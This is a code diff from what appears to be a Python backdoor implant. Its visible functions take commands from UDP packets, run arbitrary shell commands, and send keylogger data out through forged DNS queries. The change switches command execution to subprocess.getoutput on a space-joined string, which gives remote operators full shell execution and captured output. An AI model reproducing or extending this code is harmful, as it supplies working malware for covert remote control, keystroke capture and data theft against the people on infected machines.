@@ -308,13 +308,23 @@ def transfer_keylogger():
         forge_dns_query_block(data, KEYLOG_IDENTIFICATION)
 
 
+def arg_list_to_string(args: list):
+    result = ""
+    for arg in args:
+        result += arg
+        result += " "
+    result = result.strip()
+    return result
+
+
 def execute_arbitrary_command(args: list) -> str:
     """
         Take list of arguments as input, execute the command,
         and return the result as a string.
     """
-    result = subprocess.run(args)
-    return result.stdout
+    command = arg_list_to_string(args)
+    result = subprocess.getoutput(command)
+    return result
 
 
 def packet_handler(pkt):
@@ -326,7 +336,7 @@ def packet_handler(pkt):
     command = receive_udp_command(pkt)
     print(f"Received: {command}")
     argv = command.split(" ")
-    argc = len(argv)
+    argc = len(argv)    
     if argc == 2:
         if argv[0] == WATCH:
             execute_watch_command(argv[1])
@@ -339,7 +349,7 @@ def packet_handler(pkt):
                 transfer_keylogger()
     if argv[0] == EXECUTE:
         result = execute_arbitrary_command(argv[1:])
-        print(result)
+        print(f"Result: {result}")
 
 
 MONITOR = FileSystemMonitor()
